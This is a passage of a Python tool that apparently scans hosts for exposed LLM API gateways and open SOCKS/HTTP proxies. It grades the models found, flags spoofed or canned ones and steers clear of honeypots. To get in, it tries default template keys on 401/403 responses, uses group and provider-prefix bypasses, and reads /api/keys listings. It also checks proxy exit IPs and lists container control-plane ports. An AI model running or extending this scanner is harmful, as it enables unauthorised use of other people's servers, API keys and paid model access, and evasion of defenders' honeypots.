        "i am glm", "zhipu ai", "i am llama", "nexus-7b", "ironclad-7b",
        "i am nemotron", "i'm nemotron", "created by nvidia", "developed by nvidia",
    ),
    "gpt-": (
        "i am qwen", "i'm qwen", "created by alibaba", "developed by alibaba", "tongyi lab",
        "i am deepseek", "i'm deepseek", "developed by deepseek",
        "i am claude", "i'm claude", "created by anthropic", "made by anthropic", "developed by anthropic",
        "i am glm", "zhipu ai", "nexus-7b", "ironclad-7b",
        "i am nemotron", "i'm nemotron", "created by nvidia", "developed by nvidia",
    ),
    "gemini": (
        "i am qwen", "created by alibaba", "i am deepseek", "developed by deepseek",
        "i am chatgpt", "trained by openai", "i am claude", "created by anthropic",
        "i am glm", "nexus-7b", "ironclad-7b",
        "i am nemotron", "i'm nemotron", "created by nvidia", "developed by nvidia",
    ),
    "deepseek": (
        "i am claude", "i'm claude", "made by anthropic", "created by anthropic", "developed by anthropic",
        "i am chatgpt", "i'm chatgpt", "i'm a chatgpt", "created by openai", "developed by openai", "trained by openai",
        "i am gemini", "i'm gemini", "trained by google", "nexus-7b", "ironclad-7b",
    ),
    "kimi": (
        "i am chatgpt", "i'm chatgpt", "developed by openai", "created by openai", "i am gpt-",
        "i am claude", "i'm claude", "made by anthropic", "created by anthropic",
    ),
}

HONEYPOT_PERSONA_PATTERNS = (
    "served through open webui",
    "behind a litellm proxy",
    "running on koboldcpp",
    "running in text-generation-webui",
    "running in anythingllm",
    "served from lm studio",
    "served with vllm",
    "hosted with localai",
    "i'm ironclad-",
    "i am ironclad-",
    "created in-house by the team that runs this server",
    "how may i help you, kishan",
    "help you with hotel operations data",
    "i am active and standing by. please provide your next instruction",
    "developed by @megohalo",
)

HONEYPOT_REGEXES = (
    re.compile(r"\bi(?:'m|\s+am)\s+just\s+[a-z0-9._:-]+,?\s+and\s+i\s+(?:can't|cannot|don't)\s+(?:share|disclose)\s+any\s+(?:internal\s+instructions|system\s+prompts)", re.I),
    re.compile(r"\bthis\s+is\s+[a-z0-9._:-]+\s+on\s+vllm\b", re.I),
    re.compile(r"\bi(?:'m|\s+am)\s+[a-z0-9._:-]+,\s+(?:served\s+through|behind\s+a|running\s+on|running\s+in|hosted\s+with|served\s+with|served\s+from)\s+", re.I),
)


def _detect_honeypot(content: str | None) -> str | None:
    """Detect rotating multi-port honeypots and bespoke gaslighting system prompts."""
    if not content:
        return None
    cl = content.lower()
    for pat in HONEYPOT_PERSONA_PATTERNS:
        if pat in cl:
            return f"pattern:{pat}"
    for rx in HONEYPOT_REGEXES:
        m = rx.search(content)
        if m:
            return f"regex:{m.group(0)[:60]}"
    return None


def _detect_legitimate_wrapper(req_model: str, content: str | None, prompt_tokens: int | None = None) -> str | None:
    """Detect explicitly permitted agentic/CLI wrappers (Kiro is whitelisted per operator policy)."""
    cl = (content or "").lower()
    rm = (req_model or "").lower()
    if (
        "you are kiro" in cl
        or "i'm kiro" in cl
        or "i am kiro" in cl
        or "kiro-cli" in cl
        or rm.startswith(("kr/", "kiro/"))
        or (isinstance(prompt_tokens, int) and prompt_tokens >= 1800)
    ):
        return "kiro"
    if "you are claude code" in cl or "claude code, anthropic's official cli" in cl or rm.startswith("cc/"):
        return "claude_code"
    if "built on anthropic's claude agent sdk" in cl or "claude agent sdk" in cl:
        return "claude_agent_sdk"
    if "provided by duckduckgo" in cl or "assistant in duck.ai" in cl or rm.startswith("ddgw/"):
        return "duck_ai"
    return None


def _detect_tier_or_version_downgrade(req_model: str, content: str | None, resp_model: str | None = None) -> str | None:
    """Catch intra-family tier downgrades (Opus -> Sonnet/Haiku) and version downgrades (Opus 5 -> 4.5, Sonnet 4.5 -> 3.5)."""
    m = (req_model or "").lower().strip()
    if "/" in m:
        m = m.rsplit("/", 1)[-1]
    if ":" in m:
        m = m.split(":", 1)[0]
    cl = f"{content or ''}\n{resp_model or ''}".lower()
    rm = (resp_model or "").lower()

    if "claude" in m or any(m.startswith(p) for p in ("opus-", "sonnet-", "haiku-")):
        tier = "opus" if ("opus" in m or "fable" in m) else "sonnet" if "sonnet" in m else "haiku" if "haiku" in m else None
        vm = re.search(r"(?:opus|sonnet|haiku|claude|fable)[-_.]?(\d+)(?:[-_.](\d+))?(?!\d)", m)
        ver = (int(vm.group(1)), int(vm.group(2)) if vm and vm.group(2) and len(vm.group(2)) <= 2 else 0) if vm else None
        if tier == "opus":
            if "sonnet" in rm or re.search(r"\bi(?:'m|\s+am)\s+claude\s+(?:3(?:\.5|\.7)?\s+|4(?:\.5|\.6)?\s+)?sonnet\b", cl) or "specifically claude-sonnet" in cl or "i'm claude-sonnet" in cl:
                return f"DOWNGRADED_TIER:{req_model}->claude-sonnet"
            if "haiku" in rm or re.search(r"\bi(?:'m|\s+am)\s+claude\s+(?:3(?:\.5)?\s+|4(?:\.5)?\s+)?haiku\b", cl) or "i'm claude-haiku" in cl:
                return f"DOWNGRADED_TIER:{req_model}->claude-haiku"
            if ver and ver[0] >= 5:
                if re.search(r"\b(?:i'm|i am|understanding is that i'm)\s+claude\s+(?:3\s+opus|opus\s+4(?:\.\d+)?)\b", cl) or "claude-opus-4" in rm or "claude-3-opus" in rm:
                    return f"DOWNGRADED_VERSION:{req_model}->claude-opus-4.x"
        elif tier == "sonnet" and ver and ver >= (4, 5):
            if re.search(r"\bi(?:'m|\s+am)\s+claude\s+3\.(?:5|7)\s+sonnet\b", cl) or "claude-3-5-sonnet" in rm or "claude-3-7-sonnet" in rm:
                return f"DOWNGRADED_VERSION:{req_model}->claude-3.x-sonnet"
    elif "deepseek" in m and ("v4" in m or "r2" in m):
        if re.search(r"\bi(?:'m|\s+am)\s+deepseek[- ]v3\b", cl):
            return f"DOWNGRADED_VERSION:{req_model}->deepseek-v3"
    return None


def _detect_stylistic_spoof(req_model: str, content: str | None, wrapper: str | None = None) -> str | None:
    """Catch OpenAI gpt-4o-mini wearing a Claude system prompt via \\( \\)/\\[ \\] LaTeX delimiter habit."""
    if not req_model or not content or wrapper == "kiro":
        return None
    m = req_model.lower()
    if "claude" not in m and not any(m.startswith(p) for p in ("opus-", "sonnet-", "haiku-")):
        return None
    uses_openai_latex = ("\\(" in content and "\\)" in content) or ("\\[" in content and "\\]" in content)
    if not uses_openai_latex:
        return None
    cl = content.lower()
    # Check if negative constraint ('like' or 'similar') was violated or if inline quadratic formula was rendered with \( \)
    violated = bool(re.search(r"\b(?:like|similar|similarly|similarity)\b", cl))
    if violated or "\\frac{-b" in content or "b^2" in content:
        return f"openai_latex_on_claude(constraint_violated={violated})"
    return None


def _is_frontier_spoof(req_model: str, resp_model: str | None) -> bool:
    if not resp_model:
        return False
    req_low = req_model.lower()
    resp_low = str(resp_model).lower()
    if any(f in req_low for f in ("claude", "gpt-5", "gpt-6", "o3", "o4", "gemini-2.5", "gemini-3")):
        if any(s in resp_low for s in SMALL_LOCAL_SPOOF_FAMILIES):
            return True
    for family, forbidden in CROSS_VENDOR_SPOOF_RULES.items():
        if family in req_low and family not in resp_low:
            if any(bad in resp_low for bad in forbidden):
                return True
    return False


def _is_pretender_content(req_model: str, content: str | None) -> bool:
    """Detect prose self-identification that contradicts the requested model family."""
    if not req_model or not content:
        return False
    req_low = req_model.lower()
    c_low = content.lower()
    if any(k in c_low for k in ("upstream provider", "returned http", "status code", "502 bad gateway", "rate limit")):
        return False
    for family, signs in PRETENDER_PROSE_SIGNATURES.items():
        if family in req_low:
            for s in signs:
                if s in c_low:
                    return True
    return False


class AdaptiveSem:
    """In-host model concurrency that widens on evidence, never on hope.

    Widening = release() without a matching acquire() (the documented way to raise a
    Semaphore's internal value), so a host answering in <MODEL_SEM_FAST_S with no 429s
    runs up to MODEL_SEM_MAX models in flight, while a slow or throttled router stays
    at the conservative width that avoids self-inflicted upstream RPM 429s. A 429 never
    shrinks an already-widened window (a Semaphore cannot safely reclaim a permit in
    flight); it resets the fast streak and raises the bar for the next widening.
    """

    def __init__(self, start=2, cap=6, fast_s=0.35, min_samples=3):
        self._sem = asyncio.Semaphore(start)
        self.cap = max(start, cap)
        self.fast_s = fast_s
        self.min_samples = min_samples
        self.cur = start
        self._fast = 0
        self._throttled = 0

    async def __aenter__(self):
        await self._sem.acquire()
        return self

    async def __aexit__(self, *exc):
        self._sem.release()

    def observe(self, elapsed_s, hit_429=False):
        """Feed one completed model call back into the width decision."""
        if hit_429:
            self._throttled += 1
            self._fast = 0
            return
        if elapsed_s <= self.fast_s:
            self._fast += 1
            if self._fast >= self.min_samples and self._fast > 3 * self._throttled and self.cur < self.cap:
                self._sem.release()  # add one in-flight slot
                self.cur += 1
                self._fast = 0


def resume_plan(chat_models, prior_alive, max_models):
    """(reused_rows, models_to_test) for a resuming pass.

    Prior-ALIVE models are carried forward instead of re-tested, so a second pass
    spends its whole budget on the tail a first pass never reached — the fix for
    "one attempt decides forever" on dense routers. Failed models are deliberately
    NOT skipped: a transient timeout gets a fresh attempt every pass.
    """
    reused = [prior_alive[m] for m in chat_models if m in prior_alive]
    todo = [m for m in chat_models if m not in prior_alive]
    if max_models and max_models > 0:
        todo = todo[:max_models]
    return reused, todo


def _visible_text(res):
    """content, falling back to a reasoning channel (a thinking model may emit only reasoning)."""
    if not isinstance(res, dict):
        return ""
    return (res.get("content")
            or (res.get("raw_msg") or {}).get("reasoning_content")
            or res.get("reasoning_content")
            or "")


async def validate_model(session, base, chat_path, model, timeout, retries_429=1, headers=None, extra_payload=None):
    checks, score = {}, 0
    active_model = model
    active_extra = dict(extra_payload) if extra_payload else None

    # Fast Route Gate (Prompt 1): If prompt 1 fails with 4xx or 502/503, try adaptive retries before snapping!
    p1_name, p1_prompt = SOFT_PROMPTS[0]
    res1 = None
    for attempt in range(retries_429 + 1):
        res1 = await chat(session, base, chat_path, active_model, p1_prompt, timeout, headers=headers, extra_payload=active_extra)
        if res1.get("status") == 429 and attempt < retries_429:
            await asyncio.sleep(2.0)
            continue
        break

    st1 = res1.get("status") if res1 else "error"
    err_body = (res1.get("error_body") or "") if isinstance(res1, dict) else ""

    # Vault Lesson #5: NewAPI default-group bypass -> retry with base/<model>
    if st1 in (500, 503) and ("no available channel" in err_body.lower() or "under group" in err_body.lower()) and not active_model.startswith("base/"):
        byp_model = f"base/{active_model}"
        res_byp = await chat(session, base, chat_path, byp_model, p1_prompt, timeout, headers=headers, extra_payload=active_extra)
        if res_byp.get("status") == 200:
            active_model = byp_model
            res1 = res_byp
            st1 = 200
            checks["upstream_id_bypass"] = byp_model

    # Vault Lesson #9: gpt-5/gpt-6/o3 reasoning_effort="none" adaptive retry
    if st1 in (400, 502, 503, "timeout") and any(k in active_model.lower() for k in ("gpt-5", "gpt-6", "o1", "o3", "o4")):
        re_extra = dict(active_extra or {})
        re_extra["reasoning_effort"] = "none"
        res_re = await chat(session, base, chat_path, active_model, p1_prompt, timeout, headers=headers, extra_payload=re_extra)
        if res_re.get("status") == 200:
            active_extra = re_extra
            res1 = res_re
            st1 = 200
            checks["reasoning_effort_none"] = True

    # Bifrost / router explicit provider prefix adaptive retry on 400 ("specify a provider")
    if st1 == 400 and ("provider" in err_body.lower() or "invalid model" in err_body.lower()) and "/" not in active_model:
        ml = active_model.lower()
        pref = "anthropic" if "claude" in ml else ("google" if "gemini" in ml else ("deepseek" if "deepseek" in ml else "openai"))
        cand_m = f"{pref}/{active_model}"
        res_pr = await chat(session, base, chat_path, cand_m, p1_prompt, timeout, headers=headers, extra_payload=active_extra)
        if res_pr.get("status") == 200:
            active_model = cand_m
            res1 = res_pr
            st1 = 200
            checks["provider_prefix_bypass"] = cand_m

    # Small context / max_tokens=2048 rejection retry on 400 (e.g. LM Studio / local vLLM with tight n_ctx)
    if st1 == 400:
        res_mt = await chat(session, base, chat_path, active_model, p1_prompt, timeout, max_tokens=256, headers=headers, extra_payload=active_extra)
        if res_mt.get("status") == 200:
            res1 = res_mt
            st1 = 200
            checks["low_max_tokens_retry"] = 256

    # Multi-format completion endpoint fallback (/v1/messages, /v1/responses, /chat/completions, /api/v1/chat/completions, /v1/completions)
    if st1 in (404, 405, "no_choices") or (
        st1 == 400 and any(k in err_body.lower() for k in ("responses", "messages", "endpoint", "not found", "unsupported"))
    ):
        is_claude_fam = any(k in active_model.lower() for k in ("claude", "anthropic"))
        alt_paths = (
            ["/v1/messages", "/api/v1/messages", "/v1/responses", "/chat/completions", "/api/v1/chat/completions", "/v1/completions"]
            if is_claude_fam
            else ["/v1/responses", "/v1/messages", "/chat/completions", "/api/v1/chat/completions", "/v1/completions"]
        )
        for alt_cp in alt_paths:
            if alt_cp == chat_path:
                continue
            res_alt = await chat(session, base, alt_cp, active_model, p1_prompt, timeout, headers=headers, extra_payload=active_extra)
            if res_alt.get("status") == 200:
                chat_path = alt_cp
                res1 = res_alt
                st1 = 200
                checks["resolved_chat_path"] = alt_cp
                break

    model = active_model
    extra_payload = active_extra

    if st1 == 200:
        res1 = res1 if isinstance(res1, dict) else {}
        c1 = _strip_prompt_echo(res1.get("content", ""), p1_prompt)
        raw_c1 = res1.get("raw_content", "") or c1
        hp1 = _detect_honeypot(c1) or _detect_honeypot(raw_c1)
        if hp1:
            checks["honeypot_detected"] = hp1
        wrap1 = _detect_legitimate_wrapper(model, c1, res1.get("prompt_tokens"))
        if wrap1:
            checks["legitimate_wrapper"] = wrap1
        if checks.get("legitimate_wrapper") != "kiro":
            if _is_frontier_spoof(model, res1.get("resp_model")) or _is_pretender_content(model, c1):
                checks["model_echo_mismatch"] = f"{model}->{res1.get('resp_model') or 'prose_pretender'}"
            dg1 = _detect_tier_or_version_downgrade(model, c1, res1.get("resp_model"))
            if dg1:
                checks["tier_or_version_downgrade"] = dg1
        if c1.strip() and not check_stub(c1):
            score += 1
            checks[p1_name] = "pass"
            if "<think" in raw_c1.lower() or res1.get("raw_msg", {}).get("reasoning_content"):
                checks["thinking_tag"] = True
                score += 1
        elif res1.get("tool_calls"):
            # 2026-10-09: an injected-toolset gateway answers with a tool call and
            # EMPTY content. That is a live, real host — not a stub. Score partial
            # and record the tool names so the host still surfaces in triage.
            score += 0.5
            checks[p1_name] = "tool_call_only"
            checks["injected_tools"] = res1.get("tool_calls")
        else:
            checks[p1_name] = "stub_or_empty"
        # carry the gateway-behaviour signals up into the per-model checks
        if res1.get("prompt_tokens") is not None:
            checks["prompt_tokens"] = res1.get("prompt_tokens")
        if res1.get("header_leak"):
            checks["header_leak"] = True
        if c1:
            checks["sample"] = c1[:200]
    elif st1 == 429:
        checks[p1_name] = "429_active_relay"
        score += 0.5
    elif isinstance(st1, int) and (400 <= st1 < 500 or st1 in (502, 503)):
        # Early exit: upstream expired key or bad gateway!
        checks[p1_name] = f"fast_snap_{st1}"
        return {"model": model, "score": 0, "tier": f"SNAPPED_{st1}", "checks": checks}
    else:
        checks[p1_name] = f"fail_{st1}"

    # Consecutive-timeout abort: if prompt 1 timed out, try prompt 2.
    # If prompt 2 ALSO times out, snap — this is a tarpit, not slow-but-alive.
    if st1 == "timeout":
        p2_name, p2_prompt = SOFT_PROMPTS[1]
        res2 = await chat(session, base, chat_path, model, p2_prompt, timeout, headers=headers, extra_payload=extra_payload)
        st2 = res2.get("status") if res2 else "error"
        if st2 == "timeout":
            checks["early_abort"] = "consecutive_timeouts"
            return {"model": model, "score": 0, "tier": "TARPIT_TIMEOUT", "checks": checks}
        # Prompt 2 responded — process it through the normal loop below
        # (it will be re-tested as part of the remaining soft prompts)

    # Remaining soft prompts
    for name, prompt in SOFT_PROMPTS[1:]:
        res = await chat(session, base, chat_path, model, prompt, timeout, headers=headers, extra_payload=extra_payload)
        st = res.get("status") if isinstance(res, dict) else "error"
        if st == 200:
            raw_content = res.get("content", "") if isinstance(res, dict) else ""
            content = _strip_prompt_echo(raw_content, prompt)
            hp = _detect_honeypot(content) or _detect_honeypot(raw_content)
            if hp:
                checks["honeypot_detected"] = hp
            wrap = _detect_legitimate_wrapper(model, content, res.get("prompt_tokens"))
            if wrap and not checks.get("legitimate_wrapper"):
                checks["legitimate_wrapper"] = wrap
            if checks.get("legitimate_wrapper") != "kiro":
                if _is_frontier_spoof(model, res.get("resp_model")) or _is_pretender_content(model, content):
                    checks["model_echo_mismatch"] = f"{model}->{res.get('resp_model') or 'prose_pretender'}"
                dg = _detect_tier_or_version_downgrade(model, content, res.get("resp_model"))
                if dg:
                    checks["tier_or_version_downgrade"] = dg
                if name == "creative_short":
                    st_spoof = _detect_stylistic_spoof(model, content, checks.get("legitimate_wrapper"))
                    if st_spoof:
                        checks["stylistic_spoof"] = st_spoof
            if content.strip() and not check_stub(content):
                score += 1
                checks[name] = "pass"
                if name == "logic_riddle":
                    if "7" in content and not ("3" in content and content.index("3") < content.index("7")):
                        score += 1
                        checks["riddle_logic"] = "pass"
                    else:
                        checks["riddle_logic"] = "failed_deduction"
            else:
                checks[name] = "stub_or_empty"
        elif st == 429:
            checks[name] = "429_active_relay"
            score += 0.5
        elif isinstance(st, int) and (400 <= st < 500 or st in (502, 503)):
            checks[name] = f"4xx_{st}"
            return {"model": model, "score": 0, "tier": f"SNAPPED_{st}", "checks": checks}
        else:
            checks[name] = f"fail_{st}"

    # Variance Check (max_tokens=1024 so reasoning models don't starve inside <think>)
    r1 = await chat(session, base, chat_path, model, VARIANCE_PROMPT, timeout, max_tokens=1024, headers=headers, extra_payload=extra_payload)
    r2 = await chat(session, base, chat_path, model, VARIANCE_PROMPT, timeout, max_tokens=1024, headers=headers, extra_payload=extra_payload)
    if r1.get("status") == 200 and r2.get("status") == 200:
        c1, c2 = r1.get("content", "").strip(), r2.get("content", "").strip()
        if c1:
            checks["creative_sample"] = c1[:200]
        if c1 and c2 and c1 != c2:
            score += 2
            checks["variance"] = "pass"
        elif c1 and c1 == c2:
            checks["variance"] = "IDENTICAL_REPLAY_SUSPECT"

    # Verifiable Arithmetic Check — word-boundary regex on 391 (max_tokens=1024 for thinking models)
    # Strip any echoed prompt first and reject kitchen-sink stubs that stuff unrelated canary words.
    ra = await chat(session, base, chat_path, model, ARITH_PROMPT, timeout, max_tokens=1024, headers=headers, extra_payload=extra_payload)
    if ra.get("status") == 200:
        raw_arith = ra.get("content", "")
        content = _strip_prompt_echo(raw_arith, ARITH_PROMPT)
        echoed_prompt = ARITH_PROMPT[:20].lower() in raw_arith.lower()
        stuffed_canary = any(w in content.lower() for w in ("bicycle", "fizzbuzz", "is_palindrome"))
        if ARITH_RE.search(content) and not echoed_prompt and not stuffed_canary:
            score += 2
            checks["arithmetic"] = "pass"
        else:
            checks["arithmetic"] = f"wrong_answer:{content[:30]!r}"

    # Streaming Fingerprint — with TTFT ceiling and chunk-accuracy (max_tokens=1024)
    rs = await chat(session, base, chat_path, model, STREAM_PROMPT, timeout * 1.5, stream=True, max_tokens=1024, headers=headers, extra_payload=extra_payload)
    if rs.get("status") == 200:
        try:
            chunks = int(rs.get("chunks", 0))
            ttft = float(rs["ttft"]) if rs.get("ttft") is not None else None
            elapsed = float(rs.get("elapsed", 1.0))
        except (ValueError, TypeError):
            chunks, ttft, elapsed = 0, None, 1.0

        if chunks > 3 and ttft is not None and ttft < elapsed * 0.95:
            score += 2
            partial_tag = " (partial)" if rs.get("partial") else ""
            checks["streaming"] = f"pass(ttft={ttft:.2f}s chunks={chunks}{partial_tag})"
        else:
            checks["streaming"] = f"ONE_SHOT_CANNED_SUSPECT(chunks={chunks})"
    elif rs.get("status") == 429:
        checks["streaming"] = "429_active_relay"
        score += 1

    # HARD: Topic-Fidelity Check (max_tokens=1024 so reasoning preamble never starves the haiku!)
    rt = await chat(session, base, chat_path, model, TOPIC_PROMPT, timeout, max_tokens=1024, headers=headers, extra_payload=extra_payload)
    if rt.get("status") == 200:
        ct = _visible_text(rt).lower()
        if not ct.strip():
            # A1 (2026-10-26): empty prose on a host whose arithmetic passed is a LIVE
            # model with a starved/blocked visible channel, not a canned stub. One richer
            # retry (reasoning_effort=none + reasoning-channel fallback) before the verdict
            # drops from a hard kill to a partial class.
            retry_extra = dict(extra_payload or {})
            retry_extra["reasoning_effort"] = "none"
            retry_extra["enable_thinking"] = False
            rt2 = await chat(session, base, chat_path, model, TOPIC_PROMPT, timeout,
                             max_tokens=2048, headers=headers, extra_payload=retry_extra)
            ct = _visible_text(rt2).lower()
            checks["empty_content_retry"] = bool(ct.strip())
        if any(k in ct for k in TOPIC_KEYWORDS):
            score += 2
            checks["topic_fidelity"] = "pass"
        elif not ct.strip():
            checks["topic_fidelity"] = "EMPTY_CONTENT_ALIVE"
            if str(checks.get("arithmetic")) == "pass":
                score += 1
        else:
            checks["topic_fidelity"] = f"CANNED_STUB_FAIL:{ct[:60]!r}"
            return {"model": model, "score": 0, "tier": "FAKE_CANNED_STUB", "checks": checks}
    elif rt.get("status") == 429:
        checks["topic_fidelity"] = "429_active_relay"
        score += 1

    if checks.get("honeypot_detected"):
        return {"model": model, "score": 0, "tier": "FAKE_HONEYPOT", "checks": checks}
    if checks.get("model_echo_mismatch") or checks.get("tier_or_version_downgrade") or checks.get("stylistic_spoof"):
        return {"model": model, "score": score, "tier": "FAKE_MODEL_SPOOF", "checks": checks}
    if checks.get("variance") == "IDENTICAL_REPLAY_SUSPECT" or str(checks.get("arithmetic", "")).startswith("wrong_answer:"):
        return {"model": model, "score": 0, "tier": "FAKE_CANNED_STUB", "checks": checks}
    # A1 (2026-10-26): alive-but-empty is a PARTIAL class, reported as itself — never
    # hard-zeroed as a canned stub (accuracy), and never wired as GOLD/SILVER (yield).
    if str(checks.get("topic_fidelity", "")).startswith("EMPTY_CONTENT_ALIVE"):
        return {"model": model, "score": score, "tier": "EMPTY_CONTENT_ALIVE", "checks": checks}

    # Native /v1/messages truth & cryptographic signature verification for Claude models
    if score >= 6 and any(k in model.lower() for k in ("claude", "opus", "sonnet", "haiku")):
        try:
            msg_hdrs = dict(headers or {})
            msg_hdrs["Content-Type"] = "application/json"
            msg_hdrs["anthropic-version"] = "2023-06-01"
            if "x-api-key" not in {k.lower() for k in msg_hdrs}:
                msg_hdrs["x-api-key"] = "sk-test"
            if "authorization" not in {k.lower() for k in msg_hdrs}:
                msg_hdrs["Authorization"] = "Bearer sk-test"
            msg_pl = {
                "model": model,
                "system": STRUCTURED_COT_CANARY_SYSTEM_PROMPT,
                "messages": [{"role": "user", "content": "What is 17 * 23? Answer briefly."}],
                "max_tokens": 1024,
                "thinking": {"type": "enabled", "budget_tokens": 512, "display": "summarized"},
            }
            async with asyncio.timeout(min(timeout, 12.0)):
                async with session.post(
                    f"{base.rstrip('/')}/v1/messages",
                    headers=msg_hdrs,
                    json=msg_pl,
                    timeout=aiohttp.ClientTimeout(total=min(timeout, 12.0), connect=CONNECT_TIMEOUT),
                ) as rm:
                    if rm.status == 200:
                        raw_m = await rm.json(content_type=None)
                        if isinstance(raw_m, dict) and (raw_m.get("type") == "message" or isinstance(raw_m.get("content"), list)):
                            m_ret = str(raw_m.get("model") or "").strip()
                            if m_ret and _detect_tier_or_version_downgrade(model, m_ret):
                                checks["messages_truth_downgrade"] = m_ret
                                return {"model": model, "score": 0, "tier": "FAKE_MODEL_SPOOF", "checks": checks}
                            m_sig = ""
                            m_reas_parts, m_txt_parts = [], []
                            for blk in (raw_m.get("content") or []):
                                if isinstance(blk, dict):
                                    if blk.get("type") in ("thinking", "redacted_thinking"):
                                        if blk.get("signature") and not m_sig:
                                            m_sig = str(blk["signature"])
                                        if blk.get("thinking"):
                                            m_reas_parts.append(str(blk["thinking"]))
                                    elif blk.get("type") == "text" and blk.get("text"):
                                        m_txt_parts.append(str(blk["text"]))
                            if m_sig:
                                _sp_sig, _rsn_sig, _ = verify_anthropic_messages_signature(
                                    m_sig, str(raw_m.get("id") or ""), model
                                )
                                if _sp_sig:
                                    checks["messages_signature_spoof"] = _rsn_sig
                                    return {"model": model, "score": 0, "tier": "FAKE_MODEL_SPOOF", "checks": checks}
                            _sp_cot, _rsn_cot = check_structured_cot_canary_obedience(
                                "\n".join(m_reas_parts), "\n".join(m_txt_parts), model
                            )
                            if _sp_cot:
                                checks["messages_cot_spoof"] = _rsn_cot
                                return {"model": model, "score": 0, "tier": "FAKE_MODEL_SPOOF", "checks": checks}
                    elif rm.status in (404, 405):
                        cot_extra = dict(extra_payload or {})
                        cot_extra["messages"] = [
                            {"role": "system", "content": STRUCTURED_COT_CANARY_SYSTEM_PROMPT},
                            {"role": "user", "content": "Write 2 sentences about a rain-slicked Tokyo rooftop at midnight."},
                        ]
                        cot_extra["reasoning_effort"] = "high"
                        cot_extra["thinking"] = {"type": "enabled", "budget_tokens": 1024}
                        rc_cot = await chat(
                            session,
                            base,
                            chat_path,
                            model,
                            "Write 2 sentences about a rain-slicked Tokyo rooftop at midnight.",
                            min(timeout, 12.0),
                            max_tokens=220,
                            headers=headers,
                            extra_payload=cot_extra,
                        )
                        if rc_cot.get("status") == 200:
                            _sp_cot2, _rsn_cot2 = check_structured_cot_canary_obedience(
                                str((rc_cot.get("raw_msg") or {}).get("reasoning_content") or ""),
                                _visible_text(rc_cot),
                                model,
                            )
                            if _sp_cot2:
                                checks["chat_cot_spoof"] = _rsn_cot2
                                return {"model": model, "score": 0, "tier": "FAKE_MODEL_SPOOF", "checks": checks}
        except Exception:
            pass

    tier = "GOLD" if score >= 9 else "SILVER" if score >= 6 else "BRONZE" if score >= 3 else "FAKE"
    return {"model": model, "score": score, "tier": tier, "checks": checks}


async def probe_path_fast(session, base, m_path, c_path, headers=None):
    """Fast 3.5s probe to discover model paths in parallel (with default-template-key fallback on 401/403)."""
    try:
        async with asyncio.timeout(3.5):
            async with session.get(f"{base}{m_path}", headers=headers,
                                   timeout=aiohttp.ClientTimeout(total=3.5, connect=CONNECT_TIMEOUT)) as r:
                if r.status == 200:
                    data = await r.json(content_type=None)
                    m_list = []
                    if isinstance(data, dict):
                        raw_m = data.get("data") or data.get("models") or []
                        if isinstance(raw_m, list):
                            for item in raw_m:
                                if isinstance(item, dict):
                                    mid = item.get("id") or item.get("name")
                                    if mid:
                                        s_mid = str(mid)
                                        if s_mid.startswith("models/"):
                                            s_mid = s_mid[len("models/"):]
                                        m_list.append(s_mid)
                                elif isinstance(item, str):
                                    m_list.append(item)
                        elif isinstance(raw_m, dict):
                            m_list.extend([str(k) for k in raw_m.keys()])
                        elif m_path == "/model/info":
                            m_list.extend([str(k) for k in data.keys() if k != "data"])
                    if m_list:
                        # If /v1/models has Bifrost-style provider/model IDs, also check /api/keys for unlisted provider models
                        if m_path == "/v1/models" and any("/" in x for x in m_list):
                            try:
                                async with session.get(
                                    f"{base}/api/keys",
                                    headers=headers,
                                    timeout=aiohttp.ClientTimeout(total=2.0, connect=CONNECT_TIMEOUT),
                                ) as rk:
                                    if rk.status == 200:
                                        kdata = await rk.json(content_type=None)
                                        if isinstance(kdata, list):
                                            for kitem in kdata:
                                                if isinstance(kitem, dict) and kitem.get("provider") and isinstance(kitem.get("models"), list):
                                                    prov = str(kitem["provider"]).strip()
                                                    for km in kitem["models"]:
                                                        if km:
                                                            km_s = str(km).strip()
                                                            m_list.append(km_s if "/" in km_s else f"{prov}/{km_s}")
                            except Exception:
                                pass
                        return (m_path, c_path, list(dict.fromkeys(m_list)))
                    if (
                        isinstance(data, dict)
                        and not data.get("error")
                        and data.get("type") != "error"
                        and (isinstance(data.get("data"), list) or isinstance(data.get("models"), list))
                    ):
                        return (m_path, c_path, list(UNLISTED_CANARY_MODELS))
                elif r.status in (401, 403) and headers is None and m_path == "/v1/models":
                    for tk in DEFAULT_TEMPLATE_KEYS:
                        hdr = {"Authorization": tk}
                        res_tk = await probe_path_fast(session, base, m_path, c_path, headers=hdr)
                        if res_tk:
                            return (res_tk[0], res_tk[1], res_tk[2], hdr)
    except Exception:
        pass
    return None


PROXY_CANDIDATE_PORTS = {
    1080, 1081, 2080, 3128, 7890, 7891, 8080, 8081, 8082, 8118, 8888, 9050, 9080, 10808, 10809,
}
PURE_PROXY_PORTS = {1080, 1081, 2080, 3128, 7890, 7891, 8118, 9050, 10808, 10809}
# Container/cluster control-plane ports: skip the LLM battery, go straight to sidecar triage
CONTROL_PLANE_PORTS = {2375, 2377, 2379, 4243, 10250, 10255, 6443, 4646, 5050, 8500}


async def _probe_socks5_exit(ip: str, port: int, timeout: float = 3.0) -> str | None:
    """Zero-dependency asyncio SOCKS5 no-auth handshake + exit IP check via api.ipify.org:80."""
    writer = None
    try:
        async with asyncio.timeout(timeout):
            reader, writer = await asyncio.open_connection(ip, port)
            writer.write(b"\x05\x01\x00")
            await writer.drain()
            resp = await reader.readexactly(2)
            if resp != b"\x05\x00":
                return None
            target_host = b"api.ipify.org"
            req = b"\x05\x01\x00\x03" + bytes([len(target_host)]) + target_host + (80).to_bytes(2, "big")
            writer.write(req)
            await writer.drain()
            hdr = await reader.readexactly(4)
            if hdr[0] != 5 or hdr[1] != 0:
                return None
            atyp = hdr[3]
            if atyp == 1:
                await reader.readexactly(4 + 2)
            elif atyp == 3:
                dlen = (await reader.readexactly(1))[0]
                await reader.readexactly(dlen + 2)
            elif atyp == 4:
                await reader.readexactly(16 + 2)
            http_req = (
                b"GET /?format=json HTTP/1.1\r\n"
                b"Host: api.ipify.org\r\n"
                b"User-Agent: curl/8.5.0\r\n"
                b"Connection: close\r\n\r\n"
            )
            writer.write(http_req)
            await writer.drain()
            raw = await reader.read(2048)
            txt = raw.decode("utf-8", errors="ignore")
            if "{" in txt and "ip" in txt:
                body = txt[txt.find("{"):txt.rfind("}") + 1]
                data = json.loads(body)
                if isinstance(data, dict) and data.get("ip"):
                    return str(data["ip"])
    except Exception:
        return None
    finally:
        if writer is not None:
            try:
                writer.close()
            except Exception:
                pass
    return None


async def _probe_http_connect_tunnel(ip: str, port: int, timeout: float = 2.5) -> bool:
    """Verify the HTTP proxy supports HTTPS CONNECT tunneling (port 443), not just plain HTTP GET."""
    writer = None
    try:
